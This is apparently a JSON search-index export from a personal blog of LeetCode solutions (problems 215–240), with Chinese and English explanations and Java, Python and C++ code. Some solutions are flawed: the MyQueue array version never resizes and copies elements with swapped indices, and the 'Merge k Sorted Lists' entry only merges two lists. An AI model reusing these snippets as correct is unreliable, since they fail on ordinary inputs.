Array","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-215-Kth-Largest-Element-in-an-Array/","text":"Find the $k$th largest element in an unsorted array. Note that it is the $k$th largest element in the sorted order, not the $k$th distinct element. Example 1: 12Input: [3,2,1,5,6,4] and k = 2Output: 5 Example 2: 12Input: [3,2,3,1,2,4,5,5,6] and k = 4Output: 4 Note: You may assume $k$ is always valid, $1 ≤ k ≤$ array’s length. Java题目要我们求第$k$大的元素。最直接的方法就是将数组排序，然后取出对应元素。时间复杂度是$n\\log(n)$，空间复杂度为$O(1)$。 1234public int findKthLargest(int[] nums, int k) &#123; Arrays.sort(nums); return nums[nums.length - k];&#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Divide and Conquer","slug":"Divide-and-Conquer","permalink":"http://larryim.cc/tags/Divide-and-Conquer/"},{"name":"Heap","slug":"Heap","permalink":"http://larryim.cc/tags/Heap/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"22. Generate Parentheses","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-22-Generate-Parentheses/","text":"题目Given $n$ pairs of parentheses, write a function to generate all combinations of well-formed parentheses. For example, given $n = 3$, a solution set is: 1234567[ &quot;((()))&quot;, &quot;(()())&quot;, &quot;(())()&quot;, &quot;()(())&quot;, &quot;()()()&quot;] 中文题目罗列出n组括号的所有合法的排列组合。注意点： 只有一种括号形式() 123例子：输入: n = 3 输出: [&apos;((()))&apos;, &apos;(()())&apos;, &apos;(())()&apos;, &apos;()(())&apos;, &apos;()()()&apos;] 思路解题思路：回溯法，递归的思想，判断匹配成功（递归返回）的条件为：左右括号数保持一致并且括号字符串的长度等于$2\\times N$。 只要左括号(的数量没有超过N，都可以插入左括号(。 插入右括号)的前提则是当前的左括号(数量必须要多于当前的右括号)数量。 123456789101112131415class Solution(object): def generateParenthesis(self, N): ans = [] def backtrack(S = '', left = 0, right = 0): print(S) if len(S) == 2 * N: ans.append(S) return if left &lt; N: backtrack(S +'(', left+1, right) if right &lt; left: backtrack(S +')', left, right+1) backtrack() return ans Your runtime beats 100.00 % of python3 submissions.","tags":[{"name":"Backtracking","slug":"Backtracking","permalink":"http://larryim.cc/tags/Backtracking/"},{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"String","slug":"String","permalink":"http://larryim.cc/tags/String/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"216. Combination Sum III","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-216-Combination-Sum-III/","text":"题目Find all possible combinations of $k$ numbers that add up to a number $n$, given that only numbers from 1 to 9 can be used and each combination should be a unique set of numbers. Note: All numbers will be positive integers. The solution set must not contain duplicate combinations. Example 1: 12Input: k = 3, n = 7Output: [[1,2,4]] Example 2: 12Input: k = 3, n = 9Output: [[1,2,6], [1,3,5], [2,3,4]] 分析这道题和前面的Combination Sum主要的区别是它规定了有k个数。所以除了base case变动以外，其他都可以保持一致。 12345678910111213141516171819202122232425262728293031323334class Solution &#123;public: void combinationSum3Helper(int k, int n, vector&lt;int&gt;&amp; candidates, vector&lt;vector&lt;int&gt;&gt;&amp; res, vector&lt;int&gt;&amp; chosen, int position)&#123; if (k==0)&#123; //base case if (n==0)&#123; res.push_back(chosen); &#125; &#125;else&#123; for (int i=position; i&lt;candidates.size(); i++)&#123; // choose chosen.push_back(candidates[i]); // explore combinationSum3Helper(k-1, n-candidates[i], candidates, res, chosen, i+1); // unchoose chosen.pop_back(); &#125; &#125; &#125; //Find all possible combinations of k numbers that add up to a number n vector&lt;vector&lt;int&gt;&gt; combinationSum3(int k, int n) &#123; vector&lt;int&gt; candidates=&#123;1,2,3,4,5,6,7,8,9&#125;, chosen; vector&lt;vector&lt;int&gt;&gt; res; combinationSum3Helper(k, n, candidates, res, chosen, 0); return res; &#125;&#125;;","tags":[{"name":"Backtracking","slug":"Backtracking","permalink":"http://larryim.cc/tags/Backtracking/"},{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Array","slug":"Array","permalink":"http://larryim.cc/tags/Array/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"224. Basic Calculator","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-224-Basic-Calculator/","text":"Implement a basic calculator to evaluate a simple expression string. The expression string may contain open ( and closing parentheses ), the plus + or minus sign -, non-negative integers and empty spaces . Example 1: 12Input: &quot;1 + 1&quot;Output: 2 Example 2: 12Input: &quot; 2-1 + 2 &quot;Output: 3 Example 3: 12Input: &quot;(1+(4+5+2)-3)+(6+8)&quot;Output: 23 Note: You may assume that the given expression is always valid. Do not use the eval built-in library function.","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Stack","slug":"Stack","permalink":"http://larryim.cc/tags/Stack/"},{"name":"Math","slug":"Math","permalink":"http://larryim.cc/tags/Math/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"213. House Robber II","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-213-House-Robber-II/","text":"You are a professional robber planning to rob houses along a street. Each house has a certain amount of money stashed. All houses at this place are arranged in a circle. That means the first house is the neighbor of the last one. Meanwhile, adjacent houses have security system connected and it will automatically contact the police if two adjacent houses were broken into on the same night. Given a list of non-negative integers representing the amount of money of each house, determine the maximum amount of money you can rob tonight without alerting the police. Example 1: 1234Input: [2,3,2]Output: 3Explanation: You cannot rob house 1 (money = 2) and then rob house 3 (money = 2), because they are adjacent houses. Example 2: 1234Input: [1,2,3,1]Output: 4Explanation: Rob house 1 (money = 1) and then rob house 3 (money = 3). Total amount you can rob = 1 + 3 = 4. Java这道题目是LeetCode 198. House Robber的延伸，既然已经知道了House Robber怎么写的，那么就可以把这道题目分解了。由于房子是圆形排列的，因此，不能同时抢首尾的房子，也就是说有两种抢法：0~last-1和1~last。 12345678910111213141516public int rob(int[] nums) &#123; if (nums == null) return 0; int n = nums.length; if (n == 1) return nums[0]; return Math.max(rob(nums, 1, n), rob(nums, 0, n - 1));&#125; private int rob(int[] nums, int start, int end) &#123; int last = 0, secondLast = 0, cur = 0; for (int i = start; i &lt; end; i++) &#123; cur = Math.max(nums[i] + secondLast, last); secondLast = last; last = cur; &#125; return cur; &#125;","tags":[{"name":"Dynamic Programming","slug":"Dynamic-Programming","permalink":"http://larryim.cc/tags/Dynamic-Programming/"},{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"225. Implement Stack using Queues","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-225-mplementStackUsingQueues/","text":"Implement the following operations of a stack using queues. push(x) – Push element x onto stack. pop() – Removes the element on top of the stack. top() – Get the top element. empty() – Return whether the stack is empty. Example: 1234567MyStack stack = new MyStack();stack.push(1);stack.push(2); stack.top(); // returns 2stack.pop(); // returns 2stack.empty(); // returns false Notes: You must use only standard operations of a queue – which means only push to back, peek/pop from front, size, and is empty operations are valid. Depending on your language, queue may not be supported natively. You may simulate a queue by using a list or deque (double-ended queue), as long as you use only standard operations of a queue. You may assume that all operations are valid (for example, no pop or top operations will be called on an empty stack). Java很简单，直接上代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445import java.util.LinkedList;import java.util.Queue;class MyStack &#123; private Queue&lt;Integer&gt; queue; /** Initialize your data structure here. */ public MyStack() &#123; queue = new LinkedList&lt;Integer&gt;(); &#125; /** Push element x onto stack. */ public void push(int x) &#123; queue.add(x); int i = 1, n = queue.size(); while (i++ &lt; n) &#123; queue.add(queue.poll()); &#125; &#125; /** Removes the element on top of the stack and returns that element. */ public int pop() &#123; return queue.poll(); &#125; /** Get the top element. */ public int top() &#123; return queue.peek(); &#125; /** Returns whether the stack is empty. */ public boolean empty() &#123; return queue.isEmpty(); &#125;&#125;/** * Your MyStack object will be instantiated and called as such: * MyStack obj = new MyStack(); * obj.push(x); * int param_2 = obj.pop(); * int param_3 = obj.top(); * boolean param_4 = obj.empty(); */","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Stack","slug":"Stack","permalink":"http://larryim.cc/tags/Stack/"},{"name":"Design","slug":"Design","permalink":"http://larryim.cc/tags/Design/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"226. Invert Binary Tree","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-226-Invert-Binary-Tree/","text":"Invert a binary tree. Example: 1234567891011121314Input: 4 / \\ 2 7 / \\ / \\1 3 6 9Output: 4 / \\ 7 2 / \\ / \\9 6 3 1 Java最开始想到的方法是递归，而且也很简单。 123456789public TreeNode invertTree(TreeNode root) &#123; if (root == null) return null; TreeNode tmp = root.right; root.right = root.left; root.left = tmp; invertTree(root.left); invertTree(root.right); return root;&#125; 使用DFS的递归: 123456789class Solution &#123; public TreeNode invertTree(TreeNode root) &#123; if (root == null) return null; TreeNode tmpRight = root.right; root.right = invertTree(root.left); root.left = invertTree(tmpRight); return root; &#125;&#125; 递归的时间和空间复杂度是$O(n)$, $n$是节点数。 还有迭代的方法 1234567891011121314public TreeNode invertTreeQueue(TreeNode root) &#123; if (root == null) return null; Queue&lt;TreeNode&gt; queue = new LinkedList&lt;TreeNode&gt;(); queue.add(root); while (!queue.isEmpty()) &#123; TreeNode current = queue.poll(); TreeNode temp = current.left; current.left = current.right; current.right = temp; if (current.left != null) queue.add(current.left); if (current.right != null) queue.add(current.right); &#125; return root;&#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Tree","slug":"Tree","permalink":"http://larryim.cc/tags/Tree/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"222. Count Complete Tree Nodes","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-222-Count-Complete-Tree-Nodes/","text":"Given a complete binary tree, count the number of nodes. Note: Definition of a complete binary tree from Wikipedia: In a complete binary tree every level, except possibly the last, is completely filled, and all nodes in the last level are as far left as possible. It can have between 1 and $2^h$ nodes inclusive at the last level h. Example: 12345678Input: 1 / \\ 2 3 / \\ /4 5 6Output: 6 Java这道题目看起来是非常简单的。要求计算完全二叉树的节点个数。这不是很简单吗？遍历每一个节点。 12345678910111213private int count; public int countNodes(TreeNode root) &#123; count = 0; traversal(root); return count; &#125; private void traversal(TreeNode root) &#123; if (root == null) return; count++; traversal(root.left); traversal(root.right); &#125; 然而提交结果是超时。所以肯定不能用$O(n)$的算法了, 最好是$O(\\log(n))$的算法。 123456789101112131415161718int height(TreeNode root) &#123; return root == null ? -1 : 1 + height(root.left);&#125; public int countNodes(TreeNode root) &#123; int num = 0, h = height(root); while (root != null) &#123; if (height(root.right) == h - 1) &#123; num += 1 &lt;&lt; h; root = root.right; &#125; else &#123; num += 1 &lt;&lt; h-1; root = root.left; &#125; h--; &#125; return num;&#125; 树的高度height(root)可以连续访问左子节点得到: 单一节点的树高度为0; 如果整棵树是空的，则高度为-1。 首先确认右子树的高度是不是整棵树的高度减去1(height(root.right) == h - 1)。 如果是，则意味着左子树和右子树有相同的高度，左子树为完全二叉树，最后一个节点肯定在右子树。由于左子树的高度为$h-1$，且是完全二叉树，所以节点个数为$2^h - 1$。左子树节点数，加上根节点数1，然后迭代的加上右子树的节点数，即为整棵树的节点数。 如果不是，说明右子树的高度为$h-2$，且左子树不是完全二叉树，最后一个节点在左子树。右子树的节点数$2^{h-1}-1$，加上根节点数1，然后迭代的加上左子树的节点数，即为整棵树的节点数。 求树的高度的时间复杂度为$O(\\log(n))$，一共有$O(\\log(n))$次循环，总的时间复杂度为$O(\\log(n)^2)$。","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Tree","slug":"Tree","permalink":"http://larryim.cc/tags/Tree/"},{"name":"Binary Search","slug":"Binary-Search","permalink":"http://larryim.cc/tags/Binary-Search/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"221. Maximal Square","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-221-Maximal-Square/","text":"Given a 2D binary matrix filled with 0’s and 1’s, find the largest square containing only 1’s and return its area. Example: Input: 1 0 1 0 0 1 0 1 1 1 1 1 1 1 1 1 0 0 1 0 Output: 4 Java这道题目有点像LeetCode 53. Maximum Subarray。不过这道题目难了很多，从一维变成了二维，从连续子数组的最大和变成了连续矩阵的最大面积。应该来说，本质上没有发生变化，但是寻找对应的状态转移方程，难度大了许多。基本思路仿照Kadane’s algorithm，也就是有maxEndingHere(i,j)记录到以$(i,j)$为右下角的最大矩阵，maxSoFar(i,j)记录从(0,0)到$(i,j)$的最大矩阵。 但是怎么求maxEndingHere(i, j)呢？一个$(i,j)$为右下角的最大矩阵，它的左边、右边、左上角肯定都是1。 1dp(i, j) = min(dp(i−1, j), dp(i−1, j−1), dp(i, j−1)) + 1. 完整的Java代码 123456789101112131415public int maximalSquare(char[][] matrix) &#123; if (matrix == null) return 0; int m = matrix.length, n = m &gt; 0 ? matrix[0].length : 0; int maxSquare = 0; //maxSoFar int [][] dp = new int[m + 1][n + 1]; //maxEndingHere for (int i = 1; i &lt;= m; i++) &#123; for (int j = 1; j &lt;= n; j++) &#123; if (matrix[i - 1][j - 1] == '1') &#123; dp[i][j] = 1 + Math.min(dp[i - 1][j - 1], Math.min(dp[i - 1][j], dp[i][j - 1])); if (dp[i][j] &gt; maxSquare) maxSquare = dp[i][j]; &#125; &#125; &#125; return maxSquare*maxSquare;&#125;","tags":[{"name":"Dynamic Programming","slug":"Dynamic-Programming","permalink":"http://larryim.cc/tags/Dynamic-Programming/"},{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"23. Merge k Sorted Lists","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-23-Merge-k-Sorted-Lists/","text":"题目Merge $k$ sorted linked lists and return it as one sorted list. Analyze and describe its complexity. 中文题目将$k$个有序的链表拼接成一个有序的链表。 思路为了避免分类讨论，添加一个假的头节点。现在只需要两个指针分别指向原来的两个链表，将其中比较小的节点添加到新的链表中。传入的参数l1和l2正好可以当作遍历两个链表的指针。 123456789101112131415161718192021222324252627282930313233# Definition for singly-linked list.# class ListNode:# def __init__(self, x):# self.val = x# self.next = Noneclass Solution: def mergeTwoLists(self, l1, l2): \"\"\" :type l1: ListNode :type l2: ListNode :rtype: ListNode \"\"\" temp = ListNode(-1) head = temp while l1 and l2: if l1.val &lt; l2.val: temp.next = l1 l1 = l1.next else: temp.next = l2 l2 = l2.next temp = temp.next if l1: temp.next = l1 if l2: temp.next = l2 return head.next Your runtime beats 100.00 % of python3 submissions.","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Linked List","slug":"Linked-List","permalink":"http://larryim.cc/tags/Linked-List/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"230. Kth Smallest Element in a BST","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-230-Kth-Smallest-Element-in-a-BST/","text":"Given a binary search tree, write a function kthSmallest to find the kth smallest element in it. Note:You may assume $k$ is always valid, $1 ≤ k ≤$ BST’s total elements. Example 1: 1234567Input: root = [3,1,4,null,2], k = 1 3 / \\ 1 4 \\ 2Output: 1 Example 2: 123456789Input: root = [5,3,6,2,4,null,null,1], k = 3 5 / \\ 3 6 / \\ 2 4 / 1Output: 3 Follow up: What if the BST is modified (insert/delete operations) often and you need to find the $k$th smallest frequently? How would you optimize the $k$thSmallest routine? Java这道题目要求我们求出第$k$个小的节点。既然是二叉搜索树，由于二叉搜索树的中序遍历(94. Binary Tree Inorder Traversal )的结果是递增序列。所以最直接的方法就是进行二叉搜索树的中序遍历，当遍历到第$k$个节点时，返回该节点。 123456789101112131415public int kthSmallest(TreeNode root, int k) &#123; Stack&lt;TreeNode&gt; stack = new Stack&lt;&gt;(); TreeNode cur = root; int curk = 0; while (cur != null || !stack.isEmpty()) &#123; while (cur != null) &#123; stack.push(cur); cur = cur.left; &#125; cur = stack.pop(); if (++curk == k) return cur.val; cur = cur.right; &#125; return 0; &#125; 但这种方案是比较低效的，万一$k$值接近于节点个数呢？也就说这种算法在最坏情况下的时间复杂度是$O(n)$，而且由于要保存节点，在最坏情况下空间复杂度也是$O(n)$。有没有更快的方法呢？当然是有的。二叉搜索树支持有序的方法(order-based methods)，它支持计算子树的节点的个数。一开始可以计算左子树的个数，当左子树节点的个数小于$k$时，说明第$k$个节点必定在左子树；当等于左子树节点的个数加1时，说明根节点就是第$k$个小的节点；否则寻找右子树。该方法非常类似与floor(x):返回小于或者等于$x$的最大节点。 123456789101112public int kthSmallest(TreeNode root, int k) &#123; int count = size(root.left); if (k &lt;= count) return kthSmallest(root.left, k); else if (k &gt; count + 1) return kthSmallest(root.right, k - 1 - count); // 1 is counted as current node return root.val;&#125;// 树的节点个数public int size(TreeNode root) &#123; if (root == null) return 0; return 1 + size(root.left) + size(root.right);&#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Tree","slug":"Tree","permalink":"http://larryim.cc/tags/Tree/"},{"name":"Binary Search","slug":"Binary-Search","permalink":"http://larryim.cc/tags/Binary-Search/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"235. Lowest Common Ancestor of a Binary Search Tree","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-235-Lowest-Common-Ancestor-of-a-Binary-Search-Tree/","text":"Given a binary search tree (BST), find the lowest common ancestor (LCA) of two given nodes in the BST. According to the definition of LCA on Wikipedia: The lowest common ancestor is defined between two nodes p and q as the lowest node in T that has both p and q as descendants (where we allow a node to be a descendant of itself). Given binary search tree: root = [6,2,8,0,4,7,9,null,null,3,5] 1234567 _______6______ / \\ ___2__ ___8__/ \\ / \\0 _4 7 9 / \\ 3 5 Example 1: 123Input: root = [6,2,8,0,4,7,9,null,null,3,5], p = 2, q = 8Output: 6Explanation: The LCA of nodes 2 and 8 is 6. Example 2: 1234Input: root = [6,2,8,0,4,7,9,null,null,3,5], p = 2, q = 4Output: 2Explanation: The LCA of nodes 2 and 4 is 2, since a node can be a descendant of itself according to the LCA definition. Note: All of the nodes’ values will be unique. p and q are different and both values will exist in the BST. Java最近公共祖先，有两层主要含义：第一，必须是公共祖先，第二，节点所在的高度要是最高的。 那么怎么寻找最近公共祖先呢？注意，题目的限定————二叉搜索树，这里要用到二叉搜索树的性质。 如果p, q都比根节点小，则在左子树中递归查找LCA。 如果p, q都比根节点大，则在右子树中递归查找LCA。 如果p, q一个比根节点大，一个比根节点小，或有一个等于根节点，则根节点为LCA。 12345public TreeNode lowestCommonAncestor(TreeNode root, TreeNode p, TreeNode q) &#123; if (p.val &lt; root.val &amp;&amp; q.val &lt; root.val) return lowestCommonAncestor(root.left, p, q); if (p.val &gt; root.val &amp;&amp; q.val &gt; root.val) return lowestCommonAncestor(root.right, p, q); return root;&#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Tree","slug":"Tree","permalink":"http://larryim.cc/tags/Tree/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"234. Palindrome Linked List","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-234-Palindrome-Linked-List/","text":"Given a singly linked list, determine if it is a palindrome. Example 1: 12Input: 1-&gt;2Output: false Example 2: 12Input: 1-&gt;2-&gt;2-&gt;1Output: true Follow up:Could you do it in O(n) time and O(1) space? 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106package com.leetcode;/** * An Palindrome is a sequence of characters * which reads the same backward or forward. * * * 这道题目第一让人联想到的就是Leetcode Q206ReverseLinkedList， * 即将链表反转，然后一一比对。 * * 在这里，只要将链表的后半部分反转，然后利用两个指针分别指向链表首尾， * 依次向前/向后移动指针，直到到达中点。 * * 我觉得这里的难点主要是要考虑一些特殊情况，比如说只有2，3个元素的这种链表。 * */public class Q234PalindromeLinkedList &#123; public static boolean isPalindrome(ListNode head) &#123; if ((head == null) || (head.next == null)) &#123; return true; &#125; // find lenth int len; ListNode pos = head; for (len = 0; pos != null; len++) &#123; pos = pos.next; &#125; // find middle node ListNode mid = head; for (int i = 0; i &lt; (len-1)/2; i++) mid = mid.next; // reverse ListNode cur = mid.next; if (cur.next != null) &#123; ListNode next; for (pos = mid; cur.next != null; ) &#123; next = cur.next; cur.next = pos; pos = cur; cur = next; &#125; cur.next = pos; &#125; else &#123; cur.next = mid; &#125; ListNode tail = cur; // compare the first and second half nodes while (tail != mid) &#123; if (tail.val != head.val) &#123; return false; &#125; tail = tail.next; head = head.next; &#125; return true; &#125; /** * 寻找mid和tail时其实不用计算链表长度 * 只要有两个指针，一块一慢，遍历链表即可 */ public static boolean isPalindromeUsingQuickFindMidTail(ListNode head) &#123; if ((head == null) || (head.next == null)) &#123; return true; &#125; // A trick to quickly find mid and tail of linked list ListNode mid = head, tail = head.next; while ((tail != null) &amp;&amp; (tail.next != null)) &#123; mid = mid.next; tail = tail.next.next; &#125; // reverse ListNode cur = mid.next, pos, next; if (cur.next != null) &#123; for (pos = mid; cur.next != null; ) &#123; next = cur.next; cur.next = pos; pos = cur; cur = next; &#125; cur.next = pos; &#125; else &#123; cur.next = mid; &#125; tail = cur; // compare the first and second half nodes while (tail != mid) &#123; if (tail.val != head.val) &#123; return false; &#125; tail = tail.next; head = head.next; &#125; return true; &#125;&#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Two Pointers","slug":"Two-Pointers","permalink":"http://larryim.cc/tags/Two-Pointers/"},{"name":"Linked List","slug":"Linked-List","permalink":"http://larryim.cc/tags/Linked-List/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"232. Implement Queue using Stacks","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-232-Implement-Queue-using-Stacks/","text":"Implement the following operations of a queue using stacks. push(x) – Push element x to the back of queue. pop() – Removes the element from in front of queue. peek() – Get the front element. empty() – Return whether the queue is empty. Example: 1234567MyQueue queue = new MyQueue();queue.push(1);queue.push(2); queue.peek(); // returns 1queue.pop(); // returns 1queue.empty(); // returns false Notes: You must use only standard operations of a stack – which means only push to top, peek/pop from top, size, and is empty operations are valid.Depending on your language, stack may not be supported natively. You may simulate a stack by using a list or deque (double-ended queue), as long as you use only standard operations of a stack.You may assume that all operations are valid (for example, no pop or peek operations will be called on an empty queue). 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364class MyQueue &#123; private int[] items; private int size; private int head; private int tail; private int len; /** Initialize your data structure here. */ public MyQueue() &#123; items = new int[10]; size = 0; head = 0; tail = 0; len = 0; &#125; /** Push element x to the back of queue. */ public void push(int x) &#123; items[tail++] = x; if (tail == size) &#123; resize(2*size); &#125; len++; &#125; /** Removes the element from in front of queue and returns that element. */ public int pop() &#123; len--; return items[head++]; &#125; /** Get the front element. */ public int peek() &#123; return items[head]; &#125; /** Returns whether the queue is empty. */ public boolean empty() &#123; return (len==0); &#125; private void resize(int newSize) &#123; int newItems[] = new int[newSize]; for (int i = head, j = 0; i &lt;= tail; i++, j++) &#123; newItems[i] = items[j]; &#125; head = 0; tail = items.length; size = newSize; items = newItems; &#125;&#125;/** * Your MyQueue object will be instantiated and called as such: * MyQueue obj = new MyQueue(); * obj.push(x); * int param_2 = obj.pop(); * int param_3 = obj.peek(); * boolean param_4 = obj.empty(); */","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Stack","slug":"Stack","permalink":"http://larryim.cc/tags/Stack/"},{"name":"Design","slug":"Design","permalink":"http://larryim.cc/tags/Design/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"236. Lowest Common Ancestor of a Binary Tree","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-236-Lowest-Common-Ancestor-of-a-Binary-Tree/","text":"Given a binary tree, find the lowest common ancestor (LCA) of two given nodes in the tree. According to the definition of LCA on Wikipedia: “The lowest common ancestor is defined between two nodes p and q as the lowest node in T that has both p and q as descendants (where we allow a node to be a descendant of itself).” Given the following binary tree: root = [3,5,1,6,2,0,8,null,null,7,4] 1234567 _______3______ / \\ ___5__ ___1__/ \\ / \\6 _2 0 8 / \\ 7 4 Example 1: 123Input: root = [3,5,1,6,2,0,8,null,null,7,4], p = 5, q = 1Output: 3Explanation: The LCA of of nodes 5 and 1 is 3. Example 2: 1234Input: root = [3,5,1,6,2,0,8,null,null,7,4], p = 5, q = 4Output: 5Explanation: The LCA of nodes 5 and 4 is 5, since a node can be a descendant of itself according to the LCA definition. Note: All of the nodes’ values will be unique. p and q are different and both values will exist in the binary tree. Java","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Tree","slug":"Tree","permalink":"http://larryim.cc/tags/Tree/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"24. Swap Nodes in Pairs","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-24-Swap-Nodes-in-Pairs/","text":"题目Given a linked list, swap every two adjacent nodes and return its head. For example,Given 1-&gt;2-&gt;3-&gt;4, you should return the list as 2-&gt;1-&gt;4-&gt;3. Your algorithm should use only constant space. You may not modify the values in the list, only nodes itself can be changed. 中文题目将链表中相邻的两个节点交换位置，注意第一个节点与第二个节点要交换位置，而第二个节点不用与第三个节点交换位置。 例子： 输入: head = 1-&gt;2-&gt;3-&gt;4 输出: 2-&gt;1-&gt;4-&gt;3 不允许修改节点的值, 且只能用常量的额外空间 思路1234567891011121314151617181920212223242526272829# Definition for singly-linked list.# class ListNode(object):# def __init__(self, x):# self.val = x# self.next = Noneclass Solution(object): def swapPairs(self, head): \"\"\" :type head: ListNode :rtype: ListNode \"\"\" newhead = ListNode(0) newhead.next = head results = newhead while newhead.next and newhead.next.next: before = newhead first = newhead.next second = first.next after = second.next before.next = second second.next = first first.next = after newhead = newhead.next.next return results.next","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Linked List","slug":"Linked-List","permalink":"http://larryim.cc/tags/Linked-List/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"237. Delete Node in a Linked List","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-237-Delete-Node-in-a-Linked-List/","text":"Write a function to delete a node (except the tail) in a singly linked list, given only access to that node. Given linked list – head = [4,5,1,9], which looks like following: 14 -&gt; 5 -&gt; 1 -&gt; 9 Example 1: 1234Input: head = [4,5,1,9], node = 5Output: [4,1,9]Explanation: You are given the second node with value 5, the linked list should become 4 -&gt; 1 -&gt; 9 after calling your function. Example 2: 1234Input: head = [4,5,1,9], node = 1Output: [4,5,9]Explanation: You are given the third node with value 1, the linked list should become 4 -&gt; 5 -&gt; 9 after calling your function. Note: The linked list will have at least two elements. All of the nodes’ values will be unique. The given node will not be the tail and it will always be a valid node of the linked list. Do not return anything from your function. Java在单向链表中删除一个节点，最常规的做法是从链表的头结点开始，顺序遍历查找要删除的节点，并在链表中删除该节点。例如下图(a)中删除节点$i$，找到$i$的前一个节点$h$，让$h$指向$j$。时间复杂度是$O(n)$. 之所以需要从头开始查找，是因为我们需要得到将被删除的结点的前⾯⼀个结点。但这是必须的吗？答案是否定的。如果把下一个节点的内容复制到需要删除的节点上，再删除下一个节点，其效果等于删除当前节点。 123456789/** * we have to replace the value of the node we want to * delete with the value in the node after it, * and then delete the node after it. */public void deleteNode(ListNode node) &#123; node.val = node.next.val; node.next = node.next.next;&#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Linked List","slug":"Linked-List","permalink":"http://larryim.cc/tags/Linked-List/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"240. Search a 2D Matrix II","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-240-Search-a-2D-Matrix-II/","text":"Write an efficient algorithm that searches for a value in an $m x\\times n$ matrix. This matrix has the following properties: Integers in each row are sorted in ascending from left to right. Integers in each column are sorted in ascending from top to bottom. Example: Consider the following matrix: 1234567[ [1, 4, 7, 11, 15], [2, 5, 8, 12, 19], [3, 6, 9, 16, 22], [10, 13, 14, 17, 24], [18, 21, 23, 26, 30]] 